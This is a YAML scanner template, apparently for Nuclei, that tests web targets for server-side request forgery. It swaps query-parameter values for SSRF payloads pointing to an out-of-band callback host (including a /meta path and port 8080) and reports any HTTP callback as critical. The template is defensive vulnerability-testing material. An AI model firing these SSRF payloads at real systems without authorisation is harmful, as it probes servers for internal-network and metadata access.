http:
- fuzzing:
  - fuzz:
    - '{{ssrf}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    ssrf:
    - http://{{interactsh-url}}
    - http://{{interactsh-url}}/meta
    - http://{{interactsh-url}}:8080/
  stop-at-first-match: true
id: ai-fuzz-ssrf-dnslog
info:
  author: openai
  name: SSRF DNS Interaction
  severity: critical
  tags: ssrf,dast,oob
